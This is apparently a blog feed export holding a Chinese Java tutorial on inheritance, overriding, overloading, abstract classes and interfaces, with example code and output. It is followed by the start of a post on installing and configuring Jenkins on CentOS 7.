<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><ul>
<li>继承格式有两种，方式一：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class 父类 &#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class 子类 extends 父类 &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>方式二</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">implements</span> <span class="title class_">A</span>,B &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>代码实例</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动物类为父类主要包的动作为吃、睡觉、介绍等方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="comment">// 重载，主要用来初始化name 和id</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String myName, <span class="type">int</span> myId)</span> &#123;</span><br><span class="line">        name = myName;</span><br><span class="line">        id = myId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;正在吃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;正在睡&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">introduction</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大家好！我是&quot;</span>         + id + <span class="string">&quot;号&quot;</span> + name + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 继承父类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mouse</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Mouse</span><span class="params">(String myName,<span class="type">int</span> myId)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用的就是Animal父类的重载函数Animal(String myName, int myId)</span></span><br><span class="line">        <span class="built_in">super</span>(myName, myId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;子类：我吃完了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eatTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 调用父类方法</span></span><br><span class="line">        <span class="built_in">super</span>.eat();</span><br><span class="line">        <span class="comment">// this指向子类本身</span></span><br><span class="line">        <span class="built_in">this</span>.eat();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//super用来调用父类方法</span></span><br><span class="line"><span class="comment">// this指向子类本身</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>得到结果</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">Mouse</span> <span class="variable">mose</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mouse</span>(<span class="string">&quot;老鼠&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        mose.eatTest();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">----</span><br><span class="line">老鼠正在吃</span><br><span class="line">子类：我吃完了</span><br></pre></td></tr></table></figure>

<h2 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h2><ul>
<li>重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变。<strong>即外壳不变，核心重写！</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动物类为父类主要包的动作为吃、睡觉、介绍等方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="comment">// 重载，主要用来初始化name 和id</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String myName, <span class="type">int</span> myId)</span> &#123;</span><br><span class="line">        name = myName;</span><br><span class="line">        id = myId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;正在吃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;正在睡&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">introduction</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大家好！我是&quot;</span>         + id + <span class="string">&quot;号&quot;</span> + name + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mouse</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String Name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> Id;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Mouse</span><span class="params">(String myName,<span class="type">int</span> myId)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用的就是Animal父类的重载函数Animal(String myName, int myId)</span></span><br><span class="line">        <span class="built_in">super</span>(myName, myId);</span><br><span class="line">        <span class="built_in">this</span>.Name = myName;</span><br><span class="line">        <span class="built_in">this</span>.Id = myId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.Name+ <span class="string">&quot;：我吃完了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 自定义方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老鼠可以在叫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&quot;我是动物父类&quot;</span>,<span class="number">1001</span>);</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mouse</span>(<span class="string">&quot;老鼠&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        a.eat();      <span class="comment">// 调用父类的eat方法，结果为：我是动物父类正在吃</span></span><br><span class="line">        b.eat();     <span class="comment">// 尽管b属于Animal类型，但是它运行的是 Mouse子类的eat，这里重写了父类的eat方法，结果为：老鼠：我吃完</span></span><br><span class="line">        b.sleep();  <span class="comment">//同时b调用分类本身的sleep</span></span><br><span class="line">        <span class="comment">// 总结：当分类指向子类时</span></span><br><span class="line">        <span class="comment">// 1.若子类和父类使用相同方法eat，那么子类中的方法eat重写了父类中的方法eat</span></span><br><span class="line">        <span class="comment">// 2.父类可直接调用父类中方法</span></span><br><span class="line">        <span class="comment">// 3.子类中的方法在父类中不存在，那么指定调用子类中的方法报错</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里标红报错了</span></span><br><span class="line">        b.dark();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>当需要在子类中调用父类的被重写方法时，要使用 super 关键字。继承中已经介绍</p>
</blockquote>
<h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><ul>
<li>重载(overloading) 是在一个类里面，<strong>方法名字相同，而参数不同</strong>。返回类型可以相同也可以不同</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Overloading</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//以下两个参数类型顺序不同</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="type">int</span> a,String s)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test3&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;returntest3&quot;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(String s,<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test4&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;returntest4&quot;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Overloading</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Overloading</span>();</span><br><span class="line">        System.out.println(o.test());</span><br><span class="line">        o.test(<span class="number">1</span>);</span><br><span class="line">        System.out.println(o.test(<span class="number">1</span>,<span class="string">&quot;test3&quot;</span>));</span><br><span class="line">        System.out.println(o.test(<span class="string">&quot;test4&quot;</span>,<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>实例中重载方法为test</p>
</blockquote>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><ul>
<li>多态存在的三个条件：继承、重写、父类引用指向子类对象，在重写实例中刚好包含了这三要素。</li>
</ul>
<h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><ul>
<li><p>如果一个类中没有包含足够的信息来描绘一个具体的对象，这样的类就是抽象类。</p>
</li>
<li><p>抽象类除了<strong>不能实例化对象</strong>之外，类的其它功能依然存在，抽象类必须被继承，才能被使</p>
</li>
<li><p>一个类只能继承一个抽象类，而一个类却可以实现多个接口（留作后续）</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动物类为父类主要包的动作为吃、睡觉、介绍等方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="comment">// 重载，主要用来初始化name 和id</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String myName, <span class="type">int</span> myId)</span> &#123;</span><br><span class="line">        name = myName;</span><br><span class="line">        id = myId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;正在吃&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;正在睡&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">introduction</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;大家好！我是&quot;</span>         + id + <span class="string">&quot;号&quot;</span> + name + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mouse</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String Name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> Id;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Mouse</span><span class="params">(String myName,<span class="type">int</span> myId)</span> &#123;</span><br><span class="line">        <span class="comment">// 调用的就是Animal父类的重载函数Animal(String myName, int myId)</span></span><br><span class="line">        <span class="built_in">super</span>(myName, myId);</span><br><span class="line">        <span class="built_in">this</span>.Name = myName;</span><br><span class="line">        <span class="built_in">this</span>.Id = myId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.Name+ <span class="string">&quot;：我吃完了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 自定义方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老鼠可以在叫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="comment">// 这样不行报错了，不可用直接实例化</span></span><br><span class="line"><span class="comment">//        Animal a = new Animal(&quot;我是动物父类&quot;,1001);</span></span><br><span class="line">        <span class="type">Mouse</span> <span class="variable">mouse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mouse</span>(<span class="string">&quot;老鼠&quot;</span>, <span class="number">1001</span>);</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mouse</span>(<span class="string">&quot;老鼠2号&quot;</span>, <span class="number">1002</span>);</span><br><span class="line">        a.eat(); <span class="comment">//老鼠2号：我吃完了</span></span><br><span class="line">        mouse.eat(); <span class="comment">// 老鼠：我吃完了</span></span><br><span class="line">        mouse.sleep();</span><br><span class="line">        <span class="comment">// 子类中的方法在父类中不存在，调用子类中的方法报错</span></span><br><span class="line">        <span class="comment">//a.dark();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>和重写的那个实例非常接近，唯一区别就是不用实例化父类</li>
<li>根据本实例发现既然无法实例化父类，<strong>那么父类中的里具体逻辑存在没有必要</strong>，只要存在一个方法名就可以了</li>
</ul>
<h3 id="抽象方法"><a href="#抽象方法" class="headerlink" title="抽象方法"></a>抽象方法</h3><ul>
<li>如果你想设计这样一个类，该类包含一个特别的成员方法，该方法的具体实现由它的子类确定，那么你可以在父类中声明该方法为抽象方法。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 分类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="comment">// 重载，主要用来初始化name 和id</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(String myName)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mouse</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String Name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> Id;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Mouse</span><span class="params">(String myName,<span class="type">int</span> myId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.Name = myName;</span><br><span class="line">        <span class="built_in">this</span>.Id = myId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.Name+ <span class="string">&quot;：我吃完了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(String myName)</span> &#123;</span><br><span class="line">        System.out.println(myName+ <span class="string">&quot;在睡觉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老鼠可以在叫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我是一只老鼠&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">Mouse</span> <span class="variable">mouse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mouse</span>(<span class="string">&quot;老鼠&quot;</span>, <span class="number">1001</span>);</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mouse</span>(<span class="string">&quot;老鼠2号&quot;</span>, <span class="number">1002</span>);</span><br><span class="line">        a.eat(); <span class="comment">//老鼠2号：我吃完了</span></span><br><span class="line">        mouse.eat(); <span class="comment">// 老鼠：我吃完了</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ts</span> <span class="operator">=</span> a.test();</span><br><span class="line">        System.out.println(ts); <span class="comment">// 我是一只老鼠</span></span><br><span class="line">        a.sleep(<span class="string">&quot;我是老鼠啊&quot;</span>);<span class="comment">// 我是老鼠啊在睡觉</span></span><br><span class="line">        mouse.dark();</span><br><span class="line">        <span class="comment">// a.dark(); 子类中的方法在父类中不存在，调用子类中的方法报错</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>抽象类中不一定包含抽象方法，但是有抽象方法的类必定是抽象类。</li>
<li>抽象类中的抽象方法只是声明，不包含方法体，就是不给出方法的具体实现也就是方法的具体功能</li>
<li>抽象类的子类必须给出抽象类中的抽象方法的具体实现，除非该子类也是抽象类</li>
</ul>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><ul>
<li><p>接口和抽象类很像，他们是有区别的</p>
</li>
<li><p>接口和抽象类区别</p>
<ul>
<li><p>抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行</p>
</li>
<li><p>抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 <strong>public static final</strong> 类型的</p>
</li>
<li><p>一个类只能继承一个抽象类，而一个类却可以实现多个接口</p>
</li>
<li><p>接口是隐式抽象的，当声明一个接口和方法的时候，不必使用<strong>abstract</strong>关键字</p>
</li>
</ul>
</li>
<li><p>实战代码</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(String myName)</span>;</span><br><span class="line">    <span class="keyword">public</span>  String <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mouse</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String Name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> Id;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Mouse</span><span class="params">(String myName,<span class="type">int</span> myId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.Name = myName;</span><br><span class="line">        <span class="built_in">this</span>.Id = myId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.Name+ <span class="string">&quot;：我吃完了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(String myName)</span> &#123;</span><br><span class="line">        System.out.println(myName+ <span class="string">&quot;在睡觉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老鼠可以在叫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//如果不实现接口中的test方法，那么就报错了</span></span><br><span class="line">     <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">     	<span class="keyword">return</span> <span class="string">&quot;我是一只老鼠&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">Mouse</span> <span class="variable">mouse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Mouse</span>(<span class="string">&quot;老鼠&quot;</span>, <span class="number">1001</span>);</span><br><span class="line">        mouse.eat(); <span class="comment">// 老鼠：我吃完了</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ts</span> <span class="operator">=</span> mouse.test();</span><br><span class="line">        System.out.println(ts); <span class="comment">// 我是一只老鼠</span></span><br><span class="line">        mouse.sleep(<span class="string">&quot;我是老鼠啊&quot;</span>);<span class="comment">// 我是老鼠啊在睡觉</span></span><br><span class="line">        mouse.dark(); <span class="comment">// 老鼠可以在叫</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>当类实现接口的时候，类要实现（重写）接口中所有的方法，不然报错。否则，类必须声明为抽象的类</p>
</blockquote>
<h3 id="接口继承"><a href="#接口继承" class="headerlink" title="接口继承"></a>接口继承</h3><ul>
<li>感觉这里太复杂，不做详细介绍，做个简单笔记。</li>
<li>一个接口能继承另一个接口，和类之间的继承方式比较相似。接口的继承使用extends关键字，子接口继承父接口的方法。</li>
</ul>
<p>下面的Sports接口被Hockey和Football接口继承：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 文件名: Sports.java</span><br><span class="line">public interface Sports</span><br><span class="line">&#123;</span><br><span class="line">   public void setHomeTeam(String name);</span><br><span class="line">   public void setVisitingTeam(String name);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// 文件名: Football.java</span><br><span class="line">public interface Football extends Sports</span><br><span class="line">&#123;</span><br><span class="line">   public void homeTeamScored(int points);</span><br><span class="line">   public void visitingTeamScored(int points);</span><br><span class="line">   public void endOfQuarter(int quarter);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// 文件名: Hockey.java</span><br><span class="line">public interface Hockey extends Sports</span><br><span class="line">&#123;</span><br><span class="line">   public void homeGoalScored();</span><br><span class="line">   public void visitingGoalScored();</span><br><span class="line">   public void endOfPeriod(int period);</span><br><span class="line">   public void overtimePeriod(int ot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Java中，类的多继承是不合法，但接口允许多继承。</p>
<p>在接口的多继承中extends关键字只需要使用一次，在其后跟着继承接口。 如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Hockey extends Sports, Event</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Jenkins运行pytest selenium</title>
    <url>/aposts/6ef225f8/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><a href="/aposts/d8b0934a">这篇文章</a>说明了如何搭建分布式测试流程，这次主要介绍把代码放到服务器上，用<code>Jenkins</code>来运行</li>
<li>本次服务器为某云服务器，centos7 64</li>
</ul>
<h2 id="Jenkins-环境搭建"><a href="#Jenkins-环境搭建" class="headerlink" title="Jenkins 环境搭建"></a>Jenkins 环境搭建</h2><ul>
<li>下载镜像仓库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo --no-check-certificate</span><br></pre></td></tr></table></figure>

<ul>
<li>下载<code>Jenkins.io.key</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key</span><br></pre></td></tr></table></figure>

<ul>
<li>yum下载安装依赖和jenkins</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line">yum install java-11-openjdk-devel  ##如果有装jdk8以上可跳过</span><br><span class="line">yum install jenkins</span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果要修改端口，到这里修改不会生效的：<code>vim /etc/sysconfig/jenkins</code></p>
</li>
<li><p>正确的修改方式是在这个路径下</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/jenkins.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改为想要的端口</span></span><br><span class="line">Environment=&quot;JENKINS_PORT=5444&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改好路径后，重新加载服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart jenkins</span><br></pre></td></tr></table></figure>
